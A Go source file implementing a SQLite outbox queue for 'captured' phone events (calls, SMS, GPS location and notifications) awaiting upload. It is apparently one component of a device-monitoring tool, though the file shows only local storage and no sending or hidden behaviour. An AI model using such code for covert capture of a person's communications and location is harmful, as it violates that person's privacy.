package outbox

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"os"
	"sync"
	"time"

	_ "modernc.org/sqlite"
)

const dbFileName = "outbox.db"

// EventType identifies the kind of captured event.
type EventType string

const (
	EventTypeCall    EventType = "call"
	EventTypeSMS     EventType = "sms"
	EventTypeGPS     EventType = "gps"
	EventTypeNotif   EventType = "notification"
)

// Item represents a single captured event waiting to be sent.
type Item struct {
	ID        string                 `json:"id"`
	Type      EventType              `json:"type"`
	Timestamp int64                  `json:"timestamp"`
	Payload   map[string]interface{} `json:"payload"`
	Sent      bool                   `json:"sent"`
	CreatedAt int64                  `json:"created_at"`
}

// Store manages the local queue in a SQLite database.
type Store struct {
	dbPath string
	db     *sql.DB
}

var (
	globalStore *Store
	once        sync.Once
)

// Init opens/creates the SQLite database at the given directory.
func Init(dir string) error {
	var initErr error
	once.Do(func() {
		globalStore = &Store{}
		if dir != "" {
			globalStore.dbPath = dir + "/" + dbFileName
			if err := os.MkdirAll(dir, 0755); err != nil {
				initErr = fmt.Errorf("outbox: failed to create dir %s: %w", dir, err)
				return
			}
		} else {
			globalStore.dbPath = dbFileName
		}
		globalStore.open()
		if globalStore.db == nil {
			initErr = fmt.Errorf("outbox: failed to open sqlite db at %s", globalStore.dbPath)
		}
	})
	return initErr
}

// Get returns the shared store instance.
func Get() *Store {
	if globalStore == nil {
		Init("")
	}
	return globalStore
}

func (s *Store) open() {
	if s.dbPath == "" {
		return
	}

	db, err := sql.Open("sqlite", s.dbPath)
	if err != nil {
		fmt.Println("outbox: failed to open sqlite db:", err)
		return
	}

	_, err = db.Exec(`CREATE TABLE IF NOT EXISTS outbox (
		id TEXT PRIMARY KEY,
		type TEXT NOT NULL,
		timestamp INTEGER NOT NULL,
		payload TEXT NOT NULL,
		sent INTEGER NOT NULL DEFAULT 0,
		created_at INTEGER NOT NULL
	)`)
	if err != nil {
		fmt.Println("outbox: failed to create table:", err)
		return
	}

	s.db = db
}

// Enqueue appends a new item to the store.
func (s *Store) Enqueue(item Item) error {
	if s.db == nil {
		return fmt.Errorf("outbox: store not initialized")
	}

	if item.ID == "" {
		item.ID = fmt.Sprintf("%d-%d", time.Now().UnixNano(), time.Now().UnixMilli())
	}
	if item.CreatedAt == 0 {
		item.CreatedAt = time.Now().UnixMilli()
	}
	if item.Timestamp == 0 {
		item.Timestamp = item.CreatedAt
	}

	payloadBytes, err := json.Marshal(item.Payload)
	if err != nil {
		return err
	}

	_, err = s.db.Exec(
		"INSERT OR REPLACE INTO outbox (id, type, timestamp, payload, sent, created_at) VALUES (?, ?, ?, ?, ?, ?)",
		item.ID, string(item.Type), item.Timestamp, string(payloadBytes), 0, item.CreatedAt,
	)
	return err
}

// Unsent returns items that have not been sent yet.
func (s *Store) Unsent() ([]Item, error) {
	if s.db == nil {
		return nil, nil
	}

	rows, err := s.db.Query("SELECT id, type, timestamp, payload, sent, created_at FROM outbox WHERE sent = 0 ORDER BY created_at ASC")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var items []Item
	for rows.Next() {
		var item Item
		var payloadStr string
		var sentInt int
		err := rows.Scan(&item.ID, &item.Type, &item.Timestamp, &payloadStr, &sentInt, &item.CreatedAt)
		if err != nil {
			return nil, err
		}
		item.Sent = sentInt != 0
		json.Unmarshal([]byte(payloadStr), &item.Payload)
		items = append(items, item)
	}
	return items, nil
}

// MarkSent marks specific item IDs as sent.
func (s *Store) MarkSent(ids ...string) error {
	if s.db == nil || len(ids) == 0 {
		return nil
	}
	for _, id := range ids {
		_, _ = s.db.Exec("UPDATE outbox SET sent = 1 WHERE id = ?", id)
	}
	return nil
}